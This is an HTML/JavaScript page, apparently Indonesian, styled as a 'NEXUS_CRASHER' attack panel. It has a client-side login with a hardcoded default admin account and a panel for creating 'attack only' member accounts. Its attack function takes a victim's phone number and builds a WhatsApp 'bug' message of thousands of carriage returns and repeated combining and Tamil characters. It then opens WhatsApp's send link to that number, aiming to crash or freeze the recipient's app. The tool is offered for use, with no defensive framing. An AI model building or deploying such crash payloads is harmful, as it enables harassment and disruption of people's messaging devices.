<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS_CRASHER v1.1 | hanzX</title>
    <style>
        :root { --bg: #090206; --panel: #160410; --neon: #cc0033; --text: #ffffff; }
        body { background-color: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 80px; }
        .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 10px rgba(204, 0, 51, 0.5); }
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); }
        .nav-item { color: #8b8b8b; font-size: 0.8rem; cursor: pointer; }
        .active { color: var(--neon); font-weight: bold; }
        .hidden { display: none !important; }
        .badge { padding: 2px 5px; border-radius: 3px; font-size: 0.7rem; background: #00ffff; color: #000; }
    </style>
</head>
<body>

    <div id="login-screen" style="height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;">
        <h1 style="color: var(--neon); text-shadow: 0 0 15px var(--neon);">NEXUS_CRASHER</h1>
        <div class="card" style="width: 80%;">
            <input type="text" id="u" placeholder="Username...">
            <input type="password" id="p" placeholder="Password...">
            <button class="btn-main" onclick="gasLogin()">AUTHENTICATE</button>
            <p id="msg" style="color: red; text-align: center; font-size: 0.8rem;"></p>
        </div>
    </div>

    <div id="app" class="hidden">
        <div style="padding: 15px; border-bottom: 1px solid var(--neon); text-align: center; color: var(--neon); font-weight: bold;">NEXUS_CRASHER v1.1</div>
        
        <div id="p-home" class="p">
            <div class="card">
                <h3>DASHBOARD</h3>
                <p>User: <b id="u-name"></b> <span class="badge" id="u-role"></span></p>
            </div>
            <div class="card" style="padding:0; overflow:hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width:100%;"></div>
        </div>

        <div id="p-attack" class="p hidden">
            <div class="card">
                <h3>ATTACK PANEL</h3>
                <input type="number" id="target" placeholder="628xxxx">
                <button class="btn-main" onclick="dor()">SEND HEAVY BUG</button>
            </div>
        </div>

        <div id="p-admin" class="p hidden">
            <div class="card">
                <h3>ADMIN PANEL</h3>
                <input type="text" id="nu" placeholder="New User">
                <input type="password" id="np" placeholder="New Pass">
                <select id="nr">
                    <option value="OWNER">OWNER (Can Create Member)</option>
                    <option value="MEMBER">MEMBER (Attack Only)</option>
                </select>
                <button class="btn-main" onclick="tambah()">CREATE ACCOUNT</button>
            </div>
        </div>

        <nav class="nav-bottom">
            <div class="nav-item active" onclick="tab('home')">HOME</div>
            <div class="nav-item" onclick="tab('attack')">ATTACK</div>
            <div id="nav-adm" class="nav-item hidden" onclick="tab('admin')">ADMIN</div>
        </nav>
    </div>

    <script>
        // DATA DEFAULT (HANYA JALAN SEKALI)
        if(!localStorage.getItem('db')) {
            localStorage.setItem('db', JSON.stringify([{u:'hanzX', p:'admin', r:'ADMIN'}]));
        }

        function gasLogin() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const db = JSON.parse(localStorage.getItem('db'));
            const data = db.find(x => x.u === user && x.p === pass);

            if(data) {
                window.me = data;
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('app').classList.remove('hidden');
                document.getElementById('u-name').innerText = data.u;
                document.getElementById('u-role').innerText = data.r;
                if(data.r === 'ADMIN' || data.r === 'OWNER') {
                    document.getElementById('nav-adm').classList.remove('hidden');
                    if(data.r === 'OWNER') document.getElementById('nr').innerHTML = '<option value="MEMBER">MEMBER ONLY</option>';
                }
            } else {
                document.getElementById('msg').innerText = "Salah cok!";
            }
        }

        function tab(n) {
            document.querySelectorAll('.p').forEach(x => x.classList.add('hidden'));
            document.getElementById('p-' + n).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
            event.target.classList.add('active');
        }

        function tambah() {
            const nu = document.getElementById('nu').value;
            const np = document.getElementById('np').value;
            const nr = document.getElementById('nr').value;
            if(!nu || !np) return alert("Isi dulu mpray!");
            let db = JSON.parse(localStorage.getItem('db'));
            db.push({u:nu, p:np, r:nr});
            localStorage.setItem('db', JSON.stringify(db));
            alert("Berhasil buat akun " + nu);
        }

        function dor() {
            const t = document.getElementById('target').value;
            if(!t) return alert("Mana targetnya?");
            const bug = encodeURIComponent("%0D".repeat(9000) + "҈҉" + " ௌ ".repeat(500) + " [ NEXUS_V1.1 ]");
            window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
        }
    </script>
</body>
</html>
